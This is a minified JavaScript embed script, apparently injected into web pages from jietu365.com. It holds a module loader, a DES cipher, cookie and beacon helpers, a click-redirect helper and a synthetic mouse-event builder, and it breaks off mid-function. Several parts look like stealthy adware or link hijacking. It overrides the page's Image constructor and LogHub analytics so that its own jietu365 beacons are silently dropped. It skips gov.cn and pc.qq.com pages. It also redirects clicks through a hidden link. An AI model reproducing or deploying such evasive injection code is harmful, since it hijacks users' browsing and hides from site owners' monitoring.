var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function(obj) {
    return typeof obj;
} : function(obj) {
    return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
};

if (!this.com) this.com = {};

if (!this.com.jtds) this.com.jtds = {};

if (!this.com.jtds.jtds) this.com.jtds.jtds = {};

(function(global) {
    var buildNo = "";
    global.buildNo = buildNo;
    var define, require;
    var JsNode = document.getElementById("jtds-id");
    var module_config = {
        baseUrl: JsNode ? JsNode.src.substring(0, JsNode.src.lastIndexOf("/") + 1) : "",
        getModuleUrl: function getModuleUrl(module) {},
        paths: {}
    };
    var hasOwn = Object.prototype.hasOwnProperty, op = Object.prototype, ostring = op.toString, _modules = {}, waitDepends = [], _waitDepends = {}, waitModules = [], _waitModules = {}, waitRequires = [], loading = false, executing = false;
    function hasProp(obj, prop) {
        return hasOwn.call(obj, prop);
    }
    function isArray(it) {
        return ostring.call(it) === "[object Array]";
    }
    function hasDependencies(ds) {
        for (var i = 0, l = ds.length; i < l; i++) {
            if (!hasProp(_modules, ds[i])) {
                return false;
            }
        }
        return true;
    }
    function putDepends(d) {
        if (!d) return;
        if (typeof d == "string") d = [ d ];
        for (var i = 0, l = d.length; i < l; i++) {
            if (hasProp(_waitDepends, d[i]) || hasProp(_modules, d[i]) || hasProp(_waitModules, d[i])) continue;
            _waitDepends[d[i]] = true;
            waitDepends.push(d[i]);
            setTimeout(loadDepends, 1);
        }
    }
    function parseModule(m) {
        var ds = m.dependencies || [], args = [];
        for (var i = 0, l = ds.length; i < l; i++) {
            args.push(_modules[ds[i]]);
        }
        addModule(m.name, m.fn.apply(global, args));
        setTimeout(function() {
            executeWaitRequires();
        }, 1);
        return true;
    }
    function addModule(name, module) {
        _modules[name] = module;
        executeWaitModules();
        executeWaitRequires();
    }
    function putWaitModule(module) {
        if (!module) return;
        var name = module.name;
        if (hasProp(_waitModules, name)) return;
        _waitModules[name] = true;
        waitModules.push(module);
    }
    function loadDepends(waits) {
        if (loading) return;
        loading = true;
        if (typeof waits === "undefined" || !waits) {
            waits = waitDepends;
        }
        var depend = waits.shift();
        if (!depend) {
            loading = false;
            return;
        }
        var path = module_config.paths[depend] || module_config.getModuleUrl(depend), _export;
        if ((typeof path === "undefined" ? "undefined" : _typeof(path)) === "object") {
            _export = path._export;
            path = path.path;
        }
        if (path) {}
        loading = false;
        loadDepends(waits);
    }
    function executeWaitModules(waits) {
        if (typeof waits === "undefined" || !waits) {
            waits = waitModules;
        }
        var i = -1, m;
        while (++i < waits.length) {
            m = waits[i];
            if (!m) continue;
            if (hasProp(_modules, m.name)) {
                waits[i] = null;
                continue;
            }
            if (hasDependencies(m.dependencies)) {
                parseModule(m);
                waits[i] = null;
            }
        }
    }
    function parseRequire(r) {
        var ds = r.dependencies || [], args = [];
        for (var i = 0, l = ds.length; i < l; i++) {
            args.push(_modules[ds[i]]);
        }
        r.fn.apply(global, args);
        return true;
    }
    function executeWaitRequires(requires) {
        if (typeof requires === "undefined" || !requires) {
            requires = waitRequires;
        }
        if (requires.length === 0) return;
        var i = -1, r;
        while (++i < requires.length) {
            r = requires[i];
            if (!r) continue;
            if (hasDependencies(r.dependencies)) {
                parseRequire(r);
                requires[i] = null;
            }
        }
    }
    function putWaitRequire(r) {
        waitRequires.push(r);
    }
    define = function define(name, dependencies, fn, options) {
        if (hasProp(_modules, name) && !(options && options.force)) return;
        if (typeof dependencies === "function") {
            addModule(name, dependencies());
            return;
        }
        if (typeof dependencies !== "function" && !isArray(dependencies)) {
            addModule(name, dependencies);
            return;
        }
        var module = {
            name: name,
            dependencies: dependencies,
            fn: fn
        };
        var ds = module.dependencies;
        if (!hasDependencies(ds)) {
            putDepends(ds);
            putWaitModule(module);
            return;
        } else {
            parseModule(module);
        }
    };
    require = function require(dependencies, fn) {
        if (arguments.length === 0) return;
        if (typeof dependencies === "function" && arguments.length === 1) {
            fn();
            return;
        }
        if (typeof dependencies == "string") dependencies = [ dependencies ];
        var r = {
            dependencies: dependencies,
            fn: fn
        };
        var ds = r.dependencies;
        if (!hasDependencies(ds)) {
            putDepends(ds);
            putWaitRequire(r);
            return;
        } else {
            parseRequire(r);
        }
    };
    global.define = define;
    global.require = require;
    global.require.config = function(options) {
        module_config.baseUrl = options.baseUrl || module_config.baseUrl;
        for (var i in options.paths) {
            module_config[i] = options.paths[i];
        }
    };
})(this.com.jtds.jtds);

(function() {
    if (Object.defineProperty) {
        var temp = "$" + new Date().getTime() * Math.random();
        window[temp] = Image;
        Image = function Image() {
            var i = new window[temp]();
            try {
                Object.defineProperty(i, "src", {
                    set: function set(val) {
                        if (val.match(/(?:images\/track.gif\?|kss.gif\?).*jietu365.com/)) val = "";
                        this.setAttribute("src", val);
                    }
                });
                return i;
            } catch (e) {}
        };
    }
})();

(function() {
    if (window.LogHub && LogHub.behavior) {
        var _behavior = LogHub.behavior;
        LogHub.behavior = function() {
            for (var i = 0; i < arguments.length; i++) {
                if (typeof arguments[i] == "string" && arguments[i].match(/jietu365.com/)) {
                    return;
                }
            }
            _behavior.apply(LogHub, arguments);
        };
    }
})();

(function(R) {
    if (location.href.match(/pc.qq.com/)) {
        return;
    }
    var blackList = [ "gov\\.cn" ];
    for (var i = 0; i < blackList.length; i++) {
        if (new RegExp(blackList[i]).test(window.location.href)) return;
    }
    setTimeout(function() {
        R.require([ "app" ], function(app) {
            app.run();
            R.require([ "tongji" ], function(tl) {
                tl.sendActiveTL();
            });
        });
    }, 500);
})(this.com.jtds.jtds);

(function(R) {
    R.define("jquery", function() {
        return jQuery;
    });
})(com.jtds.jtds);

(function(R) {
    R.define("constants", {
        server: "www.jietu365.com",
        ruleServer: "//www.jietu365.com",
        mnyApi: "/prt/tmj.htm",
        assetsUrl: "//www.jietu365.com/embedjs/v1",
        jrServer: "//www.jietu365.com",
        clsid: "9AE955BB-E511-4E9C-B5EE-0803E0214CA2",
        mainid: "jtds-id",
        bdCode: "dde6ba2851f3db0ddc415ce0f895822e"
    });
})(this.com.jtds.jtds);

(function(R) {
    R.define("common", [ "jquery", "constants" ], function($, C) {
        var common = {
            trace: function trace(obj) {
                var p = "?u=" + R.params.u + "&s=" + R.params.s + "&c=" + R.params.c;
                for (var i in obj) {
                    switch (i) {
                      default:
                        p += "&" + i + "=" + obj[i];
                    }
                }
                new Image().src = obj.server + p;
            },
            tr: function tr(path, params) {
                params = common.getRequestParams(params);
                new Image().src = C.jrServer + "/" + path + ".gif?" + $.param(params);
            },
            parseParams: function parseParams(strParams) {
                var params = strParams ? strParams.split("&") : [];
                var _params = {};
                for (var i = 0, l = params.length; i < l && params[i]; i++) {
                    var parts = params[i].split("=");
                    _params[parts[0]] = decodeURIComponent(parts[1]);
                }
                return _params;
            },
            checksda: function checksda(t, sd) {
                return parseInt(t) > parseInt(sd);
            },
            getRequestParams: function getRequestParams(params) {
                var r = $.extend({}, R.params, params);
                return r;
            },
            redirectWhenClick: function redirectWhenClick(e, to) {
                var source = e.target.href;
                common.openLink(to);
                e.stopPropagation();
                e.preventDefault();
            },
            openLink: function openLink(url) {
                var simulateLink = $("#jtdssimulatelink");
                if (simulateLink.length > 0) {
                    simulateLink.attr("href", url);
                } else {
                    simulateLink = $('<a id="jtdssimulatelink" target="_blank" href="' + url + '"></a>').appendTo("body").css("display", "none");
                }
                simulateLink[0].click();
            },
            loadCss: function loadCss(src) {
                var cssEle = document.createElement("link");
                cssEle.rel = "stylesheet";
                cssEle.href = src;
                cssEle.type = "text/css";
                document.body.appendChild(cssEle);
            },
            debounce: function debounce(func, wait, immediate) {
                var timeout, args, context, timestamp, result;
                var later = function later() {
                    var last = $.now() - timestamp;
                    if (last < wait && last >= 0) {
                        timeout = setTimeout(later, wait - last);
                    } else {
                        timeout = null;
                        if (!immediate) {
                            result = func.apply(context, args);
                            if (!timeout) context = args = null;
                        }
                    }
                };
                return function() {
                    context = this;
                    args = arguments;
                    timestamp = $.now();
                    var callNow = immediate && !timeout;
                    if (!timeout) timeout = setTimeout(later, wait);
                    if (callNow) {
                        result = func.apply(context, args);
                        context = args = null;
                    }
                    return result;
                };
            },
            getCookie: function getCookie(name) {
                var reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
                var arr = document.cookie.match(reg);
                if (arr) {
                    return unescape(arr[2]);
                } else {
                    return null;
                }
            },
            setCookie: function setCookie(name, value, opts) {
                var optsStr = "";
                if (typeof opts == "number") {
                    opts = {
                        expires: opts
                    };
                }
                if (opts) {
                    for (var k in opts) {
                        if (k == "expires") {
                            var exp = new Date();
                            exp.setTime(exp.getTime() + opts.expires);
                            optsStr += "expires=" + exp.toGMTString() + ";";
                        } else {
                            optsStr += k + "=" + opts[k] + ";";
                        }
                    }
                }
                document.cookie = name + "=" + escape(value) + ";" + optsStr;
            },
            removeCookie: function removeCookie(name, opts) {
                opts = opts || {};
                opts.expires = -1;
                common.setCookie(name, "deleted", opts);
            },
            getArrayItem: function getArrayItem(array, filterfun) {
                var item = null;
                $.each(array, function(i, it) {
                    if (filterfun(it)) {
                        item = it;
                        return false;
                    }
                });
                return item;
            },
            checkBoxModel: function checkBoxModel() {
                if (typeof R.boxModel !== "undefined") return R.boxModel;
                var div = document.createElement("div"), body = document.body;
                div.style.cssText = "visibility:hidden;border:0;width:1px;height:0;position:static;padding:0px;margin:0px;padding-left:1px;";
                document.body.appendChild(div);
                R.boxModel = this.boxModel = div.offsetWidth === 2;
                document.body.removeChild(div);
                div = null;
                return R.boxModel;
            },
            getDomain: function getDomain(url) {
                var hostname = "";
                try {
                    hostname = url || (window.location || document.location).hostname;
                    hostname = hostname.match(/([-\w]+\.\b(?:net\.cn|com\.hk|com\.cn|com|cn|net|org|cc|tv$|hk)\b)/)[1];
                } catch (e) {}
                return hostname;
            },
            isIE: function isIE() {
                if (!!window.ActiveXObject || "ActiveXObject" in window) {
                    return true;
                } else {
                    return false;
                }
            },
            log: function log(msg) {
                if (window.console) {
                    console.log(msg);
                }
            },
            mouseEvent: function mouseEvent(type, sx, sy, cx, cy) {
                var evt;
                var e = {
                    bubbles: true,
                    cancelable: type != "mousemove",
                    view: window,
                    detail: 0,
                    screenX: sx,
                    screenY: sy,
                    clientX: cx,
                    clientY: cy,
                    ctrlKey: false,
                    altKey: false,
                    shiftKey: false,
                    metaKey: false,
                    button: 0,
                    relatedTarget: undefined
                };
                if (typeof document.createEvent == "function") {
                    evt = document.createEvent("MouseEvents");
                    evt.initMouseEvent(type, e.bubbles, e.cancelable, e.view, e.detail, e.screenX, e.screenY, e.clientX, e.clientY, e.ctrlKey, e.altKey, e.shiftKey, e.metaKey, e.button, document.body.parentNode);
                } else if (document.createEventObject) {
                    evt = document.createEventObject();
                    for (prop in e) {
                        evt[prop] = e[prop];
                    }
                    evt.button = {
                        0: 1,
                        1: 4,
                        2: 2
                    }[evt.button] || evt.button;
                }
                return evt;
            }
        };
        return common;
    });
})(this.com.jtds.jtds);

(function(R) {
    R.define("ecy", function() {
        function strEnc(data, firstKey, secondKey, thirdKey) {
            var leng = data.length;
            var encData = "";
            var firstKeyBt, secondKeyBt, thirdKeyBt, firstLength, secondLength, thirdLength;
            if (firstKey != null && firstKey != "") {
                firstKeyBt = getKeyBytes(firstKey);
                firstLength = firstKeyBt.length;
            }
            if (secondKey != null && secondKey != "") {
                secondKeyBt = getKeyBytes(secondKey);
                secondLength = secondKeyBt.length;
            }
            if (thirdKey != null && thirdKey != "") {
                thirdKeyBt = getKeyBytes(thirdKey);
                thirdLength = thirdKeyBt.length;
            }
            if (leng > 0) {
                if (leng < 4) {
                    var bt = strToBt(data);
                    var encByte;
                    if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "" && thirdKey != null && thirdKey != "") {
                        var tempBt;
                        var x, y, z;
                        tempBt = bt;
                        for (x = 0; x < firstLength; x++) {
                            tempBt = enc(tempBt, firstKeyBt[x]);
                        }
                        for (y = 0; y < secondLength; y++) {
                            tempBt = enc(tempBt, secondKeyBt[y]);
                        }
                        for (z = 0; z < thirdLength; z++) {
                            tempBt = enc(tempBt, thirdKeyBt[z]);
                        }
                        encByte = tempBt;
                    } else {
                        if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "") {
                            var tempBt;
                            var x, y;
                            tempBt = bt;
                            for (x = 0; x < firstLength; x++) {
                                tempBt = enc(tempBt, firstKeyBt[x]);
                            }
                            for (y = 0; y < secondLength; y++) {
                                tempBt = enc(tempBt, secondKeyBt[y]);
                            }
                            encByte = tempBt;
                        } else {
                            if (firstKey != null && firstKey != "") {
                                var tempBt;
                                var x = 0;
                                tempBt = bt;
                                for (x = 0; x < firstLength; x++) {
                                    tempBt = enc(tempBt, firstKeyBt[x]);
                                }
                                encByte = tempBt;
                            }
                        }
                    }
                    encData = bt64ToHex(encByte);
                } else {
                    var iterator = parseInt(leng / 4);
                    var remainder = leng % 4;
                    var i = 0;
                    for (i = 0; i < iterator; i++) {
                        var tempData = data.substring(i * 4 + 0, i * 4 + 4);
                        var tempByte = strToBt(tempData);
                        var encByte;
                        if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "" && thirdKey != null && thirdKey != "") {
                            var tempBt;
                            var x, y, z;
                            tempBt = tempByte;
                            for (x = 0; x < firstLength; x++) {
                                tempBt = enc(tempBt, firstKeyBt[x]);
                            }
                            for (y = 0; y < secondLength; y++) {
                                tempBt = enc(tempBt, secondKeyBt[y]);
                            }
                            for (z = 0; z < thirdLength; z++) {
                                tempBt = enc(tempBt, thirdKeyBt[z]);
                            }
                            encByte = tempBt;
                        } else {
                            if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "") {
                                var tempBt;
                                var x, y;
                                tempBt = tempByte;
                                for (x = 0; x < firstLength; x++) {
                                    tempBt = enc(tempBt, firstKeyBt[x]);
                                }
                                for (y = 0; y < secondLength; y++) {
                                    tempBt = enc(tempBt, secondKeyBt[y]);
                                }
                                encByte = tempBt;
                            } else {
                                if (firstKey != null && firstKey != "") {
                                    var tempBt;
                                    var x;
                                    tempBt = tempByte;
                                    for (x = 0; x < firstLength; x++) {
                                        tempBt = enc(tempBt, firstKeyBt[x]);
                                    }
                                    encByte = tempBt;
                                }
                            }
                        }
                        encData += bt64ToHex(encByte);
                    }
                    if (remainder > 0) {
                        var remainderData = data.substring(iterator * 4 + 0, leng);
                        var tempByte = strToBt(remainderData);
                        var encByte;
                        if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "" && thirdKey != null && thirdKey != "") {
                            var tempBt;
                            var x, y, z;
                            tempBt = tempByte;
                            for (x = 0; x < firstLength; x++) {
                                tempBt = enc(tempBt, firstKeyBt[x]);
                            }
                            for (y = 0; y < secondLength; y++) {
                                tempBt = enc(tempBt, secondKeyBt[y]);
                            }
                            for (z = 0; z < thirdLength; z++) {
                                tempBt = enc(tempBt, thirdKeyBt[z]);
                            }
                            encByte = tempBt;
                        } else {
                            if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "") {
                                var tempBt;
                                var x, y;
                                tempBt = tempByte;
                                for (x = 0; x < firstLength; x++) {
                                    tempBt = enc(tempBt, firstKeyBt[x]);
                                }
                                for (y = 0; y < secondLength; y++) {
                                    tempBt = enc(tempBt, secondKeyBt[y]);
                                }
                                encByte = tempBt;
                            } else {
                                if (firstKey != null && firstKey != "") {
                                    var tempBt;
                                    var x;
                                    tempBt = tempByte;
                                    for (x = 0; x < firstLength; x++) {
                                        tempBt = enc(tempBt, firstKeyBt[x]);
                                    }
                                    encByte = tempBt;
                                }
                            }
                        }
                        encData += bt64ToHex(encByte);
                    }
                }
            }
            return encData;
        }
        function strDec(data, firstKey, secondKey, thirdKey) {
            var leng = data.length;
            var decStr = "";
            var firstKeyBt, secondKeyBt, thirdKeyBt, firstLength, secondLength, thirdLength;
            if (firstKey != null && firstKey != "") {
                firstKeyBt = getKeyBytes(firstKey);
                firstLength = firstKeyBt.length;
            }
            if (secondKey != null && secondKey != "") {
                secondKeyBt = getKeyBytes(secondKey);
                secondLength = secondKeyBt.length;
            }
            if (thirdKey != null && thirdKey != "") {
                thirdKeyBt = getKeyBytes(thirdKey);
                thirdLength = thirdKeyBt.length;
            }
            var iterator = parseInt(leng / 16);
            var i = 0;
            for (i = 0; i < iterator; i++) {
                var tempData = data.substring(i * 16 + 0, i * 16 + 16);
                var strByte = hexToBt64(tempData);
                var intByte = new Array(64);
                var j = 0;
                for (j = 0; j < 64; j++) {
                    intByte[j] = parseInt(strByte.substring(j, j + 1));
                }
                var decByte;
                if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "" && thirdKey != null && thirdKey != "") {
                    var tempBt;
                    var x, y, z;
                    tempBt = intByte;
                    for (x = thirdLength - 1; x >= 0; x--) {
                        tempBt = dec(tempBt, thirdKeyBt[x]);
                    }
                    for (y = secondLength - 1; y >= 0; y--) {
                        tempBt = dec(tempBt, secondKeyBt[y]);
                    }
                    for (z = firstLength - 1; z >= 0; z--) {
                        tempBt = dec(tempBt, firstKeyBt[z]);
                    }
                    decByte = tempBt;
                } else {
                    if (firstKey != null && firstKey != "" && secondKey != null && secondKey != "") {
                        var tempBt;
                        var x, y, z;
                        tempBt = intByte;
                        for (x = secondLength - 1; x >= 0; x--) {
                            tempBt = dec(tempBt, secondKeyBt[x]);
                        }
                        for (y = firstLength - 1; y >= 0; y--) {
                            tempBt = dec(tempBt, firstKeyBt[y]);
                        }
                        decByte = tempBt;
                    } else {
                        if (firstKey != null && firstKey != "") {
                            var tempBt;
                            var x, y, z;
                            tempBt = intByte;
                            for (x = firstLength - 1; x >= 0; x--) {
                                tempBt = dec(tempBt, firstKeyBt[x]);
                            }
                            decByte = tempBt;
                        }
                    }
                }
                decStr += byteToString(decByte);
            }
            return decStr;
        }
        function getKeyBytes(key) {
            var keyBytes = new Array();
            var leng = key.length;
            var iterator = parseInt(leng / 4);
            var remainder = leng % 4;
            var i = 0;
            for (i = 0; i < iterator; i++) {
                keyBytes[i] = strToBt(key.substring(i * 4 + 0, i * 4 + 4));
            }
            if (remainder > 0) {
                keyBytes[i] = strToBt(key.substring(i * 4 + 0, leng));
            }
            return keyBytes;
        }
        function strToBt(str) {
            var leng = str.length;
            var bt = new Array(64);
            var i = 0, j = 0, p = 0, q = 0;
            if (leng < 4) {
                for (i = 0; i < leng; i++) {
                    var k = str.charCodeAt(i);
                    for (j = 0; j < 16; j++) {
                        var pow = 1, m = 0;
                        for (m = 15; m > j; m--) {
                            pow *= 2;
                        }
                        bt[16 * i + j] = parseInt(k / pow) % 2;
                    }
                }
                for (p = leng; p < 4; p++) {
                    var k = 0;
                    for (q = 0; q < 16; q++) {
                        var pow = 1, m = 0;
                        for (m = 15; m > q; m--) {
                            pow *= 2;
                        }
                        bt[16 * p + q] = parseInt(k / pow) % 2;
                    }
                }
            } else {
                for (i = 0; i < 4; i++) {
                    var k = str.charCodeAt(i);
                    for (j = 0; j < 16; j++) {
                        var pow = 1;
                        for (m = 15; m > j; m--) {
                            pow *= 2;
                        }
                        bt[16 * i + j] = parseInt(k / pow) % 2;
                    }
                }
            }
            return bt;
        }
        function bt4ToHex(binary) {
            var hex;
            switch (binary) {
              case "0000":
                hex = "0";
                break;

              case "0001":
                hex = "1";
                break;

              case "0010":
                hex = "2";
                break;

              case "0011":
                hex = "3";
                break;

              case "0100":
                hex = "4";
                break;

              case "0101":
                hex = "5";
                break;

              case "0110":
                hex = "6";
                break;

              case "0111":
                hex = "7";
                break;

              case "1000":
                hex = "8";
                break;

              case "1001":
                hex = "9";
                break;

              case "1010":
                hex = "A";
                break;

              case "1011":
                hex = "B";
                break;

              case "1100":
                hex = "C";
                break;

              case "1101":
                hex = "D";
                break;

              case "1110":
                hex = "E";
                break;

              case "1111":
                hex = "F";
                break;
            }
            return hex;
        }
        function hexToBt4(hex) {
            var binary;
            switch (hex) {
              case "0":
                binary = "0000";
                break;

              case "1":
                binary = "0001";
                break;

              case "2":
                binary = "0010";
                break;

              case "3":
                binary = "0011";
                break;

              case "4":
                binary = "0100";
                break;

              case "5":
                binary = "0101";
                break;

              case "6":
                binary = "0110";
                break;

              case "7":
                binary = "0111";
                break;

              case "8":
                binary = "1000";
                break;

              case "9":
                binary = "1001";
                break;

              case "A":
                binary = "1010";
                break;

              case "B":
                binary = "1011";
                break;

              case "C":
                binary = "1100";
                break;

              case "D":
                binary = "1101";
                break;

              case "E":
                binary = "1110";
                break;

              case "F":
                binary = "1111";
                break;
            }
            return binary;
        }
        function byteToString(byteData) {
            var str = "";
            var i, j, m;
            for (i = 0; i < 4; i++) {
                var count = 0;
                for (j = 0; j < 16; j++) {
                    var pow = 1;
                    for (m = 15; m > j; m--) {
                        pow *= 2;
                    }
                    count += byteData[16 * i + j] * pow;
                }
                if (count != 0) {
                    str += String.fromCharCode(count);
                }
            }
            return str;
        }
        function bt64ToHex(byteData) {
            var hex = "";
            var i, j;
            for (i = 0; i < 16; i++) {
                var bt = "";
                for (j = 0; j < 4; j++) {
                    bt += byteData[i * 4 + j];
                }
                hex += bt4ToHex(bt);
            }
            return hex;
        }
        function hexToBt64(hex) {
            var binary = "";
            for (var i = 0; i < 16; i++) {
                binary += hexToBt4(hex.substring(i, i + 1));
            }
            return binary;
        }
        function enc(dataByte, keyByte) {
            var keys = generateKeys(keyByte);
            var ipByte = initPermute(dataByte);
            var ipLeft = new Array(32);
            var ipRight = new Array(32);
            var tempLeft = new Array(32);
            var i = 0, j = 0, k = 0, m = 0, n = 0;
            for (k = 0; k < 32; k++) {
                ipLeft[k] = ipByte[k];
                ipRight[k] = ipByte[32 + k];
            }
            for (i = 0; i < 16; i++) {
                for (j = 0; j < 32; j++) {
                    tempLeft[j] = ipLeft[j];
                    ipLeft[j] = ipRight[j];
                }
                var key = new Array(48);
                for (m = 0; m < 48; m++) {
                    key[m] = keys[i][m];
                }
                var tempRight = xor(pPermute(sBoxPermute(xor(expandPermute(ipRight), key))), tempLeft);
                for (n = 0; n < 32; n++) {
                    ipRight[n] = tempRight[n];
                }
            }
            var finalData = new Array(64);
            for (i = 0; i < 32; i++) {
                finalData[i] = ipRight[i];
                finalData[32 + i] = ipLeft[i];
            }
            return finallyPermute(finalData);
        }
        function dec(dataByte, keyByte) {
            var keys = generateKeys(keyByte);
            var ipByte = initPermute(dataByte);
            var ipLeft = new Array(32);
            var ipRight = new Array(32);
            var tempLeft = new Array(32);
            var i = 0, j = 0, k = 0, m = 0, n = 0;
            for (k = 0; k < 32; k++) {
                ipLeft[k] = ipByte[k];
                ipRight[k] = ipByte[32 + k];
            }
            for (i = 15; i >= 0; i--) {
                for (j = 0; j < 32; j++) {
                    tempLeft[j] = ipLeft[j];
                    ipLeft[j] = ipRight[j];
                }
                var key = new Array(48);
                for (m = 0; m < 48; m++) {
                    key[m] = keys[i][m];
                }
                var tempRight = xor(pPermute(sBoxPermute(xor(expandPermute(ipRight), key))), tempLeft);
                for (n = 0; n < 32; n++) {
                    ipRight[n] = tempRight[n];
                }
            }
            var finalData = new Array(64);
            for (i = 0; i < 32; i++) {
                finalData[i] = ipRight[i];
                finalData[32 + i] = ipLeft[i];
            }
            return finallyPermute(finalData);
        }
        function initPermute(originalData) {
            var ipByte = new Array(64);
            var i, j, m, n;
            for (i = 0, m = 1, n = 0; i < 4; i++, m += 2, n += 2) {
                for (j = 7, k = 0; j >= 0; j--, k++) {
                    ipByte[i * 8 + k] = originalData[j * 8 + m];
                    ipByte[i * 8 + k + 32] = originalData[j * 8 + n];
                }
            }
            return ipByte;
        }
        function expandPermute(rightData) {
            var epByte = new Array(48);
            for (var i = 0; i < 8; i++) {
                if (i == 0) {
                    epByte[i * 6 + 0] = rightData[31];
                } else {
                    epByte[i * 6 + 0] = rightData[i * 4 - 1];
                }
                epByte[i * 6 + 1] = rightData[i * 4 + 0];
                epByte[i * 6 + 2] = rightData[i * 4 + 1];
                epByte[i * 6 + 3] = rightData[i * 4 + 2];
                epByte[i * 6 + 4] = rightData[i * 4 + 3];
                if (i == 7) {
                    epByte[i * 6 + 5] = rightData[0];
                } else {
                    epByte[i * 6 + 5] = rightData[i * 4 + 4];
                }
            }
            return epByte;
        }
        function xor(byteOne, byteTwo) {
            var xorByte = new Array(byteOne.length);
            for (var i = 0; i < byteOne.length; i++) {
                xorByte[i] = byteOne[i] ^ byteTwo[i];
            }
            return xorByte;
        }
        function sBoxPermute(expandByte) {
            var sBoxByte = new Array(32);
            var binary = "";
            var s1 = [ [ 14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7 ], [ 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8 ], [ 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0 ], [ 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13 ] ];
            var s2 = [ [ 15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10 ], [ 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5 ], [ 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15 ], [ 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9 ] ];
            var s3 = [ [ 10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8 ], [ 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1 ], [ 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7 ], [ 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12 ] ];
            var s4 = [ [ 7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15 ], [ 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9 ], [ 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4 ], [ 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14 ] ];
            var s5 = [ [ 2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9 ], [ 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6 ], [ 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14 ], [ 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3 ] ];
            var s6 = [ [ 12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11 ], [ 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8 ], [ 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6 ], [ 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13 ] ];
            var s7 = [ [ 4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1 ], [ 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6 ], [ 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2 ], [ 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12 ] ];
            var s8 = [ [ 13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7 ], [ 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2 ], [ 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8 ], [ 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11 ] ];
            var m;
            for (m = 0; m < 8; m++) {
                var i = 0, j = 0;
                i = expandByte[m * 6 + 0] * 2 + expandByte[m * 6 + 5];
                j = expandByte[m * 6 + 1] * 2 * 2 * 2 + expandByte[m * 6 + 2] * 2 * 2 + expandByte[m * 6 + 3] * 2 + expandByte[m * 6 + 4];
                switch (m) {
                  case 0:
                    binary = getBoxBinary(s1[i][j]);
                    break;

                  case 1:
                    binary = getBoxBinary(s2[i][j]);
                    break;

                  case 2:
                    binary = getBoxBinary(s3[i][j]);
                    break;

                  case 3:
                    binary = getBoxBinary(s4[i][j]);
                    break;

                  case 4:
                    binary = getBoxBinary(s5[i][j]);
                    break;

                  case 5:
                    binary = getBoxBinary(s6[i][j]);
                    break;

                  case 6:
                    binary = getBoxBinary(s7[i][j]);
                    break;

                  case 7:
                    binary = getBoxBinary(s8[i][j]);
                    break;
                }
                sBoxByte[m * 4 + 0] = parseInt(binary.substring(0, 1));
                sBoxByte[m * 4 + 1] = parseInt(binary.substring(1, 2));
                sBoxByte[m * 4 + 2] = parseInt(binary.substring(2, 3));
                sBoxByte[m * 4 + 3] = parseInt(binary.substring(3, 4));
            }
            return sBoxByte;
        }
        function pPermute(sBoxByte) {
            var pBoxPermute = new Array(32);
            pBoxPermute[0] = sBoxByte[15];
            pBoxPermute[1] = sBoxByte[6];
            pBoxPermute[2] = sBoxByte[19];
            pBoxPermute[3] = sBoxByte[20];
            pBoxPermute[4] = sBoxByte[28];
            pBoxPermute[5] = sBoxByte[11];
            pBoxPermute[6] = sBoxByte[27];
            pBoxPermute[7] = sBoxByte[16];
            pBoxPermute[8] = sBoxByte[0];
            pBoxPermute[9] = sBoxByte[14];
            pBoxPermute[10] = sBoxByte[22];
            pBoxPermute[11] = sBoxByte[25];
            pBoxPermute[12] = sBoxByte[4];
            pBoxPermute[13] = sBoxByte[17];
